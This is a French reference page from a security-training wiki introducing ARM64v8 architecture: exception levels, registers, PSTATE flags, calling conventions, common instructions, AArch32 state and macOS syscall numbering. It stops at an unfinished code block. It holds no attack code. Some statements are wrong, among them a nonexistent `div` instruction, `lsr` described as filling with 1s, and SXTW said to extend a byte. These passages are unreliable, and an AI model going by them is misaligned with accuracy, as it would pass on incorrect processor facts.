# Introduction à ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Niveaux d'exception - EL (ARM64v8)**

Dans l'architecture ARMv8, les niveaux d'exécution, appelés niveaux d'exception (Exception Levels, EL), définissent le niveau de privilège et les capacités de l'environnement d'exécution. Il existe quatre niveaux d'exception, allant de EL0 à EL3, chacun ayant un objectif différent :

1. **EL0 - Mode utilisateur** :
- Il s'agit du niveau le moins privilégié, utilisé pour exécuter le code des applications classiques.
- Les applications exécutées au niveau EL0 sont isolées les unes des autres ainsi que des logiciels système, ce qui améliore la sécurité et la stabilité.
2. **EL1 - Mode kernel du système d'exploitation** :
- La plupart des kernels de systèmes d'exploitation s'exécutent à ce niveau.
- EL1 possède davantage de privilèges que EL0 et peut accéder aux ressources système, mais avec certaines restrictions pour garantir l'intégrité du système. Le passage de EL0 à EL1 s'effectue avec l'instruction SVC.
3. **EL2 - Mode hypervisor** :
- Ce niveau est utilisé pour la virtualisation. Un hypervisor exécuté au niveau EL2 peut gérer plusieurs systèmes d'exploitation (chacun dans son propre EL1) exécutés sur le même matériel physique.
- EL2 fournit des fonctionnalités d'isolation et de contrôle des environnements virtualisés.
- Ainsi, les applications de machines virtuelles comme Parallels peuvent utiliser `hypervisor.framework` pour interagir avec EL2 et exécuter des machines virtuelles sans avoir besoin d'extensions du kernel.
- Pour passer de EL1 à EL2, l'instruction `HVC` est utilisée.
4. **EL3 - Mode Secure Monitor** :
- Il s'agit du niveau le plus privilégié. Il est souvent utilisé pour le secure boot et les environnements d'exécution de confiance.
- EL3 peut gérer et contrôler les accès entre les états secure et non-secure (comme le secure boot, les trusted OS, etc.).
- Il était utilisé pour le KPP (Kernel Patch Protection) dans macOS, mais ce n'est plus le cas.
- EL3 n'est plus utilisé par Apple.
- La transition vers EL3 s'effectue généralement avec l'instruction `SMC` (Secure Monitor Call).

L'utilisation de ces niveaux permet de gérer les différents aspects du système de manière structurée et sécurisée, des applications utilisateur jusqu'aux logiciels système les plus privilégiés. L'approche d'ARMv8 concernant les niveaux de privilège permet d'isoler efficacement les différents composants du système, améliorant ainsi sa sécurité et sa robustesse.

## **Registres (ARM64v8)**

ARM64 possède **31 registres généraux**, nommés `x0` à `x30`. Chacun peut stocker une valeur de **64 bits** (8 octets). Pour les opérations nécessitant uniquement des valeurs de 32 bits, les mêmes registres peuvent être utilisés en mode 32 bits avec les noms w0 à w30.

1. **`x0`** à **`x7`** - Ils sont généralement utilisés comme registres temporaires et pour transmettre des paramètres aux sous-routines.
- **`x0`** contient également la valeur de retour d'une fonction.
2. **`x8`** - Dans le Linux kernel, `x8` est utilisé comme numéro de system call pour l'instruction `svc`. **Dans macOS, c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Autres registres temporaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - **Registres d'appel intra-procéduraux**. Registres temporaires pour les valeurs immédiates. Ils sont également utilisés pour les appels de fonctions indirects et les stubs PLT (Procedure Linkage Table).
- **`x16`** est utilisé comme **numéro de system call** pour l'instruction **`svc`** dans **macOS**.
5. **`x18`** - **Registre de plateforme**. Il peut être utilisé comme registre général, mais sur certaines plateformes, il est réservé à des usages spécifiques à la plateforme : pointeur vers le thread environment block actuel sous Windows, ou pointeur vers la **structure de tâche actuellement exécutée dans le Linux kernel**.
6. **`x19`** à **`x28`** - Ce sont des registres préservés par l'appelé. Une fonction doit préserver les valeurs de ces registres pour son appelant ; ils sont donc sauvegardés dans la stack et restaurés avant le retour vers l'appelant.
7. **`x29`** - **Frame pointer**, utilisé pour suivre la stack frame. Lorsqu'une nouvelle stack frame est créée à la suite de l'appel d'une fonction, le registre **`x29`** est **sauvegardé dans la stack** et l'adresse du **nouveau** frame pointer (l'adresse de **`sp`**) est **stockée dans ce registre**.
- Ce registre peut également être utilisé comme registre général, bien qu'il soit généralement utilisé comme référence aux **variables locales**.
8. **`x30`** ou **`lr`** - **Link register**. Il contient l'adresse de retour lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée, en stockant la valeur de **`pc`** dans ce registre.
- Il peut également être utilisé comme n'importe quel autre registre.
- Si la fonction actuelle doit appeler une nouvelle fonction et va donc écraser `lr`, elle le sauvegarde dans la stack au début : c'est le prologue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> sauvegarder `fp` et `lr`, réserver de l'espace et obtenir le nouveau `fp`) et le restaure à la fin : c'est l'épilogue (`ldp x29, x30, [sp], #48; ret` -> restaurer `fp` et `lr`, puis retourner).
9. **`sp`** - **Stack pointer**, utilisé pour suivre le sommet de la stack.
- La valeur de **`sp`** doit toujours être conservée avec au moins un **alignement** sur un **quadword**, faute de quoi une exception d'alignement peut se produire.
10. **`pc`** - **Program counter**, qui pointe vers l'instruction suivante. Ce registre ne peut être mis à jour que par la génération d'exceptions, les retours d'exception et les branches. Les seules instructions ordinaires pouvant lire ce registre sont les instructions branch with link (BL, BLR), afin de stocker l'adresse du **`pc`** dans **`lr`** (Link Register).
11. **`xzr`** - **Registre zéro**. Également appelé **`wzr`** dans sa forme de registre **32** bits. Il peut être utilisé pour obtenir facilement la valeur zéro (opération courante) ou pour effectuer des comparaisons avec **`subs`**, comme **`subs XZR, Xn, #10`**, en ne stockant le résultat nulle part (dans **`xzr`**).

Les registres **`Wn`** sont la version **32 bits** du registre **`Xn`**.

> [!TIP]
> Les registres X0 à X18 sont volatils, ce qui signifie que leurs valeurs peuvent être modifiées par des appels de fonctions et des interruptions. En revanche, les registres X19 à X28 sont non volatils, ce qui signifie que leurs valeurs doivent être préservées lors des appels de fonctions (« callee saved »).

### Registres SIMD et à virgule flottante

Il existe également **32 autres registres de 128 bits** pouvant être utilisés pour les opérations SIMD (single instruction multiple data) optimisées et pour effectuer des opérations arithmétiques à virgule flottante. Ils sont appelés registres Vn, bien qu'ils puissent également fonctionner en **64**, **32**, **16** et **8** bits ; ils sont alors appelés **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** et **`Bn`**.

### Registres système

**Il existe des centaines de registres système**, également appelés registres à usage spécifique (SPRs), qui servent à **surveiller** et à **contrôler** le comportement des **processeurs**.\
Ils ne peuvent être lus ou définis qu'avec les instructions spéciales dédiées **`mrs`** et **`msr`**.

Les registres spéciaux **`TPIDR_EL0`** et **`TPIDDR_EL0`** sont couramment rencontrés lors du reverse engineering. Le suffixe `EL0` indique le **niveau d'exception minimal** à partir duquel le registre peut être utilisé (dans ce cas, EL0 est le niveau d'exception (privilège) normal avec lequel s'exécutent les programmes classiques).\
Ils sont souvent utilisés pour stocker l'**adresse de base de la région de mémoire du thread-local storage**. Généralement, le premier est lisible et inscriptible par les programmes exécutés au niveau EL0, tandis que le second peut être lu depuis EL0 et écrit depuis EL1 (comme le kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contient plusieurs composants du processus, sérialisés dans le registre spécial visible par le système d'exploitation **`SPSR_ELx`**, X étant le **niveau de permission** de l'exception **déclenchée** (cela permet de restaurer l'état du processus lorsque l'exception se termine).\
Les champs accessibles sont les suivants :

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Les flags de condition **`N`**, **`Z`**, **`C`** et **`V`** :
- **`N`** signifie que l'opération a produit un résultat négatif.
- **`Z`** signifie que l'opération a produit zéro.
- **`C`** signifie que l'opération a généré une retenue.
- **`V`** signifie que l'opération a produit un overflow signé :
- La somme de deux nombres positifs produit un résultat négatif.
- La somme de deux nombres négatifs produit un résultat positif.
- Lors d'une soustraction, lorsqu'un grand nombre négatif est soustrait d'un plus petit nombre positif (ou inversement) et que le résultat ne peut pas être représenté dans la plage correspondant à la taille de bits donnée.
- Évidemment, le processeur ne sait pas si l'opération est signée ou non. Il vérifie donc `C` et `V` pendant les opérations et indique si une retenue s'est produite, selon que l'opération est signée ou non signée.

> [!WARNING]
> Toutes les instructions ne mettent pas à jour ces flags. Certaines, comme **`CMP`** ou **`TST`**, le font, tout comme celles qui possèdent un suffixe `s`, telles que **`ADDS`**.

- Le flag de **largeur actuelle des registres (`nRW`)** : si sa valeur est 0, le programme s'exécutera dans l'état d'exécution AArch64 après sa reprise.
- Le **niveau d'exception actuel** (**`EL`**) : un programme classique exécuté dans EL0 aura la valeur 0.
- Le flag de **single stepping** (**`SS`**) : utilisé par les debuggers pour exécuter le programme instruction par instruction, en définissant le flag SS à 1 dans **`SPSR_ELx`** via une exception. Le programme exécutera une étape puis déclenchera une exception de single step.
- Le flag d'état d'exception illégale (**`IL`**) : il sert à signaler qu'un logiciel privilégié a effectué un transfert de niveau d'exception invalide. Ce flag est alors défini à 1 et le processeur déclenche une exception d'état illégal.
- Les flags **`DAIF`** : ils permettent à un programme privilégié de masquer sélectivement certaines exceptions externes.
- Si **`A`** vaut 1, des **asynchronous aborts** seront déclenchés. **`I`** configure la réponse aux **Interrupts Requests** (IRQs) matérielles externes, et `F` concerne les **Fast Interrupt Requests** (FIRs).
- Les flags de sélection du stack pointer (**`SPS`**) : les programmes privilégiés exécutés dans EL1 et au-dessus peuvent basculer entre leur propre registre stack pointer et celui du modèle utilisateur (par exemple entre `SP_EL1` et `EL0`). Cette commutation s'effectue en écrivant dans le registre spécial **`SPSel`**. Elle ne peut pas être effectuée depuis EL0.

## **Calling Convention (ARM64v8)**

La calling convention ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont transmis dans les registres **`x0`** à **`x7`**. Les paramètres **supplémentaires** sont transmis sur la **stack**. La valeur de **retour** est transmise dans le registre **`x0`**, ou également dans **`x1`** **si elle fait 128 bits**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **préservés** lors des appels de fonctions.

Lors de la lecture d'une fonction en assembly, recherchez le **prologue et l'épilogue de la fonction**. Le **prologue** implique généralement de **sauvegarder le frame pointer (`x29`)**, de configurer un **nouveau frame pointer** et d'**allouer de l'espace sur la stack**. L'**épilogue** implique généralement de **restaurer le frame pointer sauvegardé** et de **retourner** depuis la fonction.

### Calling Convention dans Swift

Swift possède sa propre **calling convention**, décrite dans [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instructions courantes (ARM64v8)**

Les instructions ARM64 utilisent généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le registre de **destination** dans lequel le résultat sera stocké, et **`src1`** et **`src2`** sont les registres **source**. Des valeurs immédiates peuvent également être utilisées à la place des registres source.

- **`mov`** : **Déplace** une valeur d'un **registre** vers un autre.
- Exemple : `mov x0, x1` — Cette instruction déplace la valeur de `x1` vers `x0`.
- **`ldr`** : **Charge** une valeur de la **mémoire** dans un **registre**.
- Exemple : `ldr x0, [x1]` — Cette instruction charge dans `x0` la valeur située à l'adresse mémoire pointée par `x1`.
- **Mode offset** : un offset affectant le pointeur d'origine est indiqué, par exemple :
- `ldr x2, [x1, #8]`, charge dans x2 la valeur située à x1 + 8.
- `ldr x2, [x0, x1, lsl #2]`, charge dans x2 un objet du tableau x0 situé à la position x1 (index) \* 4.
- **Mode pré-indexé** : les calculs sont appliqués à l'origine, le résultat est obtenu, puis la nouvelle origine est également stockée dans l'origine.
- `ldr x2, [x1, #8]!`, charge `x1 + 8` dans `x2` et stocke le résultat de `x1 + 8` dans x1.
- `str lr, [sp, #-4]!`, stocke le link register dans sp et met à jour le registre sp.
- **Mode post-indexé** : comme précédemment, mais l'adresse mémoire est d'abord accédée, puis l'offset est calculé et stocké.
- `ldr x0, [x1], #8`, charge `x1` dans `x0` et met à jour x1 avec `x1 + 8`.
- **Adressage relatif au PC** : dans ce cas, l'adresse à charger est calculée par rapport au registre PC.
- `ldr x1, =_start`, charge dans x1 l'adresse où commence le symbole `_start`, relativement au PC actuel.
- **`str`** : **Stocke** une valeur d'un **registre** en **mémoire**.
- Exemple : `str x0, [x1]` — Cette instruction stocke la valeur de `x0` à l'emplacement mémoire pointé par `x1`.
- **`ldp`** : **Load Pair of Registers**. Cette instruction **charge deux registres** depuis des emplacements mémoire **consécutifs**. L'adresse mémoire est généralement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple : `ldp x0, x1, [x2]` — Cette instruction charge `x0` et `x1` depuis les emplacements mémoire `x2` et `x2 + 8`, respectivement.
- **`stp`** : **Store Pair of Registers**. Cette instruction **stocke deux registres** dans des emplacements mémoire **consécutifs**. L'adresse mémoire est généralement formée en ajoutant un offset à la valeur d'un autre registre.
- Exemple : `stp x0, x1, [sp]` — Cette instruction stocke `x0` et `x1` aux emplacements mémoire `sp` et `sp + 8`, respectivement.
- `stp x0, x1, [sp, #16]!` — Cette instruction stocke `x0` et `x1` aux emplacements mémoire `sp+16` et `sp + 24`, respectivement, et met à jour `sp` avec `sp+16`.
- **`add`** : **Additionne** les valeurs de deux registres et stocke le résultat dans un registre.
- Syntaxe : add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Opérande 1
- Xn3 | #imm -> Opérande 2 (registre ou valeur immédiate)
- \[shift #N | RRX] -> Effectue un shift ou appelle RRX
- Exemple : `add x0, x1, x2` — Cette instruction additionne les valeurs de `x1` et `x2` et stocke le résultat dans `x0`.
- `add x5, x5, #1, lsl #12` — Cela équivaut à 4096 (un 1 décalé 12 fois) -> 1 0000 0000 0000 0000
- **`adds`** : effectue un `add` et met à jour les flags.
- **`sub`** : **Soustrait** les valeurs de deux registres et stocke le résultat dans un registre.
- Consultez la **syntaxe** de **`add`**.
- Exemple : `sub x0, x1, x2` — Cette instruction soustrait la valeur de `x2` à celle de `x1` et stocke le résultat dans `x0`.
- **`subs`** : comme `sub`, mais met à jour les flags.
- **`mul`** : **Multiplie** les valeurs de **deux registres** et stocke le résultat dans un registre.
- Exemple : `mul x0, x1, x2` — Cette instruction multiplie les valeurs de `x1` et `x2` et stocke le résultat dans `x0`.
- **`div`** : **Divise** la valeur d'un registre par celle d'un autre et stocke le résultat dans un registre.
- Exemple : `div x0, x1, x2` — Cette instruction divise la valeur de `x1` par `x2` et stocke le résultat dans `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`** :
- **Décalage logique vers la gauche** : ajoute des 0 à la fin en déplaçant les autres bits vers l'avant (multiplie par n fois 2).
- **Décalage logique vers la droite** : ajoute des 1 au début en déplaçant les autres bits vers l'arrière (divise par n fois 2 en non signé).
- **Décalage arithmétique vers la droite** : comme **`lsr`**, mais au lieu d'ajouter des 0 lorsque le bit de poids fort vaut 1, des **1 sont ajoutés** (division par n fois 2 en signé).
- **Rotation vers la droite** : comme **`lsr`**, mais les bits retirés à droite sont ajoutés à gauche.
- **Rotation vers la droite avec extension** : comme **`ror`**, mais avec le flag de retenue comme « bit de poids fort ». Le flag de retenue est déplacé vers le bit 31 et le bit retiré vers le flag de retenue.
- **`bfm`** : **Bitfield Move** ; ces opérations **copient les bits `0...n`** d'une valeur et les placent aux positions **`m..m+n`**. **`#s`** indique la position du **bit le plus à gauche** et **`#r`** la quantité de rotation vers la droite.
- Bitfield move : `BFM Xd, Xn, #r`
- Signed Bitfield move : `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move : `UBFM Xd, Xn, #r, #s`
- **Extraction et insertion de bitfield :** copie un bitfield depuis un registre et le copie dans un autre registre.
- **`BFI X1, X2, #3, #4`** Insère 4 bits de X2 à partir du 3e bit de X1.
- **`BFXIL X1, X2, #3, #4`** Extrait quatre bits à partir du 3e bit de X2 et les copie dans X1.
- **`SBFIZ X1, X2, #3, #4`** Étend le signe de 4 bits de X2 et les insère dans X1 à partir de la position de bit 3, en mettant les bits de droite à zéro.
- **`SBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2, étend leur signe et place le résultat dans X1.
- **`UBFIZ X1, X2, #3, #4`** Étend avec des zéros 4 bits de X2 et les insère dans X1 à partir de la position de bit 3, en mettant les bits de droite à zéro.
- **`UBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2 et place le résultat étendu avec des zéros dans X1.
- **Extension de signe vers X :** étend le signe d'une valeur (ou ajoute uniquement des 0 dans la version non signée) afin de pouvoir effectuer des opérations avec celle-ci :
- **`SXTB X1, W2`** Étend le signe d'un octet **de W2 vers X1** (`W2` représente la moitié de `X2`) afin de remplir les 64 bits.
- **`SXTH X1, W2`** Étend le signe d'un nombre de 16 bits **de W2 vers X1** afin de remplir les 64 bits.
- **`SXTW X1, W2`** Étend le signe d'un octet **de W2 vers X1** afin de remplir les 64 bits.
- **`UXTB X1, W2`** Ajoute des 0 (non signé) à un octet **de W2 vers X1** afin de remplir les 64 bits.
- **`extr` :** extrait des bits depuis une **paire spécifiée de registres concaténés**.
- Exemple : `EXTR W3, W2, W1, #3` concatène **W1+W2**, puis récupère les bits **du bit 3 de W2 jusqu'au bit 3 de W1** et les stocke dans W3.
- **`cmp`** : **Compare** deux registres et définit les flags de condition. Il s'agit d'un **alias de `subs`** qui définit le registre de destination sur le registre zéro. Utile pour vérifier si `m == n`.
- Il prend en charge la **même syntaxe que `subs`**.
- Exemple : `cmp x0, x1` — Cette instruction compare les valeurs de `x0` et `x1` et définit les flags de condition en conséquence.
- **`cmn`** : **Compare l'opérande négatif**. Il s'agit d'un **alias de `adds`** et il utilise la même syntaxe. Utile pour vérifier si `m == -n`.
- **`ccmp`** : comparaison conditionnelle ; la comparaison n'est effectuée que si une comparaison précédente était vraie et elle définit spécifiquement les bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 et x3 < x4, effectuer un jump vers func.
- Cela est dû au fait que **`ccmp`** ne sera exécutée que si le **`cmp` précédent était un `NE`**. Dans le cas contraire, les bits `nzcv` seront définis à 0 (ce qui ne satisfera pas la comparaison `blt`).
- Cela peut également être utilisé sous la forme `ccmn` (même fonctionnement, mais négatif, comme la différence entre `cmp` et `cmn`).
- **`tst`** : vérifie si certaines des valeurs comparées valent toutes deux 1 (fonctionne comme un ANDS sans stocker le résultat). Cette instruction est utile pour vérifier un registre avec une valeur et déterminer si certains bits du registre indiqués par cette valeur valent 1.
- Exemple : `tst X1, #7` Vérifie si l'un des 3 derniers bits de X1 vaut 1.
- **`teq`** : opération XOR dont le résultat est ignoré.
- **`b`** : branchement inconditionnel.
- Exemple : `b myFunction`
- Notez que cette instruction ne remplira pas le link register avec l'adresse de retour (elle ne convient donc pas aux appels de sous-routines devant revenir à leur appelant).
- **`bl`** : **Branch** with link, utilisé pour **appeler** une **sous-routine**. Stocke l'**adresse de retour dans `x30`**.
- Exemple : `bl myFunction` — Cette instruction appelle la fonction `myFunction` et stocke l'adresse de retour dans `x30`.
- Notez que cette instruction remplira le link register avec l'adresse de retour (elle convient donc aux appels de sous-routines devant revenir à leur appelant).
- **`blr`** : **Branch** with Link to Register, utilisé pour **appeler** une **sous-routine** dont la cible est **spécifiée** dans un **registre**. Stocke l'adresse de retour dans `x30`.
- Exemple : `blr x1` — Cette instruction appelle la fonction dont l'adresse est contenue dans `x1` et stocke l'adresse de retour dans `x30`.
- **`ret`** : **Retourne** depuis une **sous-routine**, généralement en utilisant l'adresse contenue dans **`x30`**.
- Exemple : `ret` — Cette instruction retourne depuis la sous-routine actuelle en utilisant l'adresse de retour contenue dans `x30`.
- **`b.<cond>`** : branchements conditionnels.
- **`b.eq`** : **Branche si égal**, en fonction de l'instruction `cmp` précédente.
- Exemple : `b.eq label` — Si l'instruction `cmp` précédente a trouvé deux valeurs égales, cette instruction effectue un jump vers `label`.
- **`b.ne`** : **Branche si différent**. Cette instruction vérifie les flags de condition (définis par une instruction de comparaison précédente) et, si les valeurs comparées sont différentes, effectue un branchement vers un label ou une adresse.
- Exemple : après une instruction `cmp x0, x1`, `b.ne label` — si les valeurs de `x0` et `x1` sont différentes, cette instruction effectue un jump vers `label`.
- **`cbz`** : **Compare and Branch on Zero**. Cette instruction compare un registre avec zéro et, s'ils sont égaux, effectue un branchement vers un label ou une adresse.
- Exemple : `cbz x0, label` — si la valeur de `x0` vaut zéro, cette instruction effectue un jump vers `label`.
- **`cbnz`** : **Compare and Branch on Non-Zero**. Cette instruction compare un registre avec zéro et, s'ils sont différents, effectue un branchement vers un label ou une adresse.
- Exemple : `cbnz x0, label` — si la valeur de `x0` est non nulle, cette instruction effectue un jump vers `label`.
- **`tbnz`** : teste un bit et effectue un branchement s'il est non nul.
- Exemple : `tbnz x0, #8, label`
- **`tbz`** : teste un bit et effectue un branchement s'il vaut zéro.
- Exemple : `tbz x0, #8, label`
- **Opérations de sélection conditionnelle** : ce sont des opérations dont le comportement varie selon les bits conditionnels.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si vrai, X0 = X1 ; si faux, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn ; si faux, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Si vrai, Xd = Xn + 1 ; si faux, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn ; si faux, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Si vrai, Xd = NOT(Xn) ; si faux, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn ; si faux, Xd = - Xm
- `cneg Xd, Xn, cond` -> Si vrai, Xd = - Xn ; si faux, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Si vrai, Xd = 1 ; si faux, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Si vrai, Xd = \<all 1> ; si faux, Xd = 0
- **`adrp`** : calcule l'**adresse de page d'un symbole** et la stocke dans un registre.
- Exemple : `adrp x0, symbol` — Cette instruction calcule l'adresse de page de `symbol` et la stocke dans `x0`.
- **`ldrsw`** : **charge** une valeur **32 bits** signée depuis la mémoire et **l'étend avec son signe à 64** bits. Cette instruction est utilisée dans les cas courants de SWITCH.
- Exemple : `ldrsw x0, [x1]` — Cette instruction charge une valeur signée de 32 bits depuis l'emplacement mémoire pointé par `x1`, l'étend avec son signe à 64 bits et la stocke dans `x0`.
- **`stur`** : **stocke la valeur d'un registre dans un emplacement mémoire**, en utilisant un offset depuis un autre registre.
- Exemple : `stur x0, [x1, #4]` — Cette instruction stocke la valeur de `x0` à l'adresse mémoire située 4 octets après l'adresse actuellement contenue dans `x1`.
- **`svc`** : effectue un **system call**. Cette instruction signifie « Supervisor Call ». Lorsque le processeur l'exécute, il **passe du mode utilisateur au mode kernel** et saute vers un emplacement mémoire spécifique où se trouve le code de **gestion des system calls du kernel**.

- Exemple :

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Prologue de fonction**

1. **Sauvegarder le link register et le frame pointer dans la stack** :
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurer le nouveau pointeur de frame** : `mov x29, sp` (configure le nouveau pointeur de frame pour la fonction actuelle)
3. **Allouer de l’espace sur la stack pour les variables locales** (si nécessaire) : `sub sp, sp, <size>` (où `<size>` correspond au nombre d’octets nécessaires)

### **Épilogue de la fonction**

1. **Désallouer les variables locales** (si elles ont été allouées) : `add sp, sp, <size>`
2. **Restaurer le registre de liaison et le pointeur de frame** :
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return** : `ret` (retourne le contrôle à l’appelant en utilisant l’adresse du link register)

## Protections mémoire courantes d’ARM

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## État d’exécution AARCH32

Armv8-A prend en charge l’exécution de programmes 32-bit. **AArch32** peut fonctionner avec l’un des **deux jeux d’instructions** : **`A32`** et **`T32`**, et peut basculer entre eux via l’**`interworking`**.\
Les programmes 64-bit **privileged** peuvent planifier l’**exécution de** programmes **32-bit** en effectuant un transfert de niveau d’exception vers le niveau 32-bit moins privilégié.\
Notez que la transition de 64-bit vers 32-bit s’effectue avec une diminution du niveau d’exception (par exemple, un programme 64-bit en EL1 déclenchant un programme en EL0). Cela se fait en définissant **le bit 4 de** **`SPSR_ELx`**, un registre spécial, **à 1** lorsque le thread du processus `AArch32` est prêt à être exécuté, tandis que le reste de `SPSR_ELx` contient le CPSR du programme **`AArch32`**. Ensuite, le processus privilégié appelle l’instruction **`ERET`**, afin que le processeur passe à **`AArch32`** et entre en A32 ou T32 selon le CPSR**.**

L’**`interworking`** s’effectue à l’aide des bits J et T du CPSR. `J=0` et `T=0` signifient **`A32`**, tandis que `J=0` et `T=1` signifient **`T32`**. Cela revient essentiellement à définir le **bit de poids faible à 1** pour indiquer que le jeu d’instructions est T32.\
Cela est défini lors des **instructions de branchement d’`interworking`**, mais peut également être défini directement avec d’autres instructions lorsque le PC est défini comme registre de destination. Exemple :

Autre exemple :
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registres

Il existe 16 registres de 32 bits (r0-r15). **De r0 à r14**, ils peuvent être utilisés pour **n'importe quelle opération**. Cependant, certains sont généralement réservés :

- **`r15`** : Compteur ordinal (toujours). Contient l'adresse de l'instruction suivante. En A32, current + 8 ; en T32, current + 4.
- **`r11`** : Frame Pointer
- **`r12`** : Registre d'appel intra-procédural
- **`r13`** : Stack Pointer (Notez que la stack est toujours alignée sur 16 octets)
- **`r14`** : Link Register

De plus, les registres sont sauvegardés dans des **`banked registries`**, qui sont des emplacements stockant les valeurs des registres afin de permettre un **fast context switching** lors de la gestion des exceptions et des opérations privilégiées, évitant ainsi de devoir sauvegarder et restaurer manuellement les registres à chaque fois.\
Cela s'effectue en **sauvegardant l'état du processeur du `CPSR` vers le `SPSR`** du mode processeur dans lequel l'exception est prise. Lors du retour de l'exception, le **`CPSR`** est restauré depuis le **`SPSR`**.

### CPSR - Current Program Status Register

Dans AArch32, le CPSR fonctionne de manière similaire à **`PSTATE`** dans AArch64 et est également enregistré dans **`SPSR_ELx`** lorsqu'une exception est prise, afin de restaurer ensuite l'exécution :

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Les champs sont divisés en plusieurs groupes :

- Application Program Status Register (APSR) : flags arithmétiques, accessibles depuis EL0
- Execution State Registers : comportement du processus (géré par l'OS).

#### Application Program Status Register (APSR)

- Les flags **`N`**, **`Z`**, **`C`**, **`V`** (comme dans AArch64)
- Le flag **`Q`** : il est défini à 1 chaque fois qu'une **integer saturation** se produit lors de l'exécution d'une instruction arithmétique spécialisée de saturation. Une fois défini à **`1`**, il conserve cette valeur jusqu'à être défini manuellement à 0. De plus, aucune instruction ne vérifie implicitement sa valeur ; il faut la lire manuellement.
- Flags **`GE`** (Greater than or equal) : ils sont utilisés dans les opérations SIMD (Single Instruction, Multiple Data), telles que "parallel add" et "parallel subtract". Ces opérations permettent de traiter plusieurs points de données avec une seule instruction.

Par exemple, l'instruction **`UADD8`** **additionne quatre paires d'octets** (provenant de deux opérandes de 32 bits) en parallèle et stocke les résultats dans un registre de 32 bits. Elle **définit ensuite les flags `GE` dans l'`APSR`** en fonction de ces résultats. Chaque flag GE correspond à l'une des additions d'octets et indique si l'addition de cette paire d'octets a **débordé**.

L'instruction **`SEL`** utilise ces flags GE pour effectuer des actions conditionnelles.

#### Execution State Registers

- Les bits **`J`** et **`T`** : **`J`** doit être égal à 0. Si **`T`** vaut 0, le jeu d'instructions A32 est utilisé, et s'il vaut 1, le jeu T32 est utilisé.
- **IT Block State Register** (`ITSTATE`) : il s'agit des bits 10-15 et 25-26. Ils stockent les conditions des instructions à l'intérieur d'un groupe préfixé par **`IT`**.
- Bit **`E`** : indique l'**endianness**.
- **Mode and Exception Mask Bits** (0-4) : ils déterminent l'état d'exécution actuel. Le 5e bit indique si le programme s'exécute en 32 bits (1) ou en 64 bits (0). Les 4 autres représentent le **exception mode** actuellement utilisé (lorsqu'une exception se produit et est en cours de traitement). La valeur définie **indique la priorité actuelle** au cas où une autre exception serait déclenchée pendant le traitement de celle-ci.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`** : certaines exceptions peuvent être désactivées à l'aide des bits **`A`**, `I`, `F`. Si **`A`** vaut 1, cela signifie que des **asynchronous aborts** seront déclenchés. **`I`** configure la réponse aux **Interrupts Requests** (IRQs) du matériel externe, et `F` concerne les **Fast Interrupt Requests** (FIRs).

## macOS

### BSD syscalls

Consultez [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) ou exécutez `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. Les BSD syscalls auront **x16 > 0**.

### Mach Traps

Consultez dans [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table`, et dans [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) les prototypes. Le nombre maximal de Mach traps est `MACH_TRAP_TABLE_COUNT` = 128. Les Mach traps auront **x16 < 0**. Vous devez donc appeler les numéros de la liste précédente avec un **moins** : **`_kernelrpc_mach_vm_allocate_trap`** vaut **`-10`**.

Vous pouvez également vérifier **`libsystem_kernel.dylib`** dans un désassembleur afin de trouver comment appeler ces syscalls (ainsi que les BSD syscalls) :
```bash
# macOS
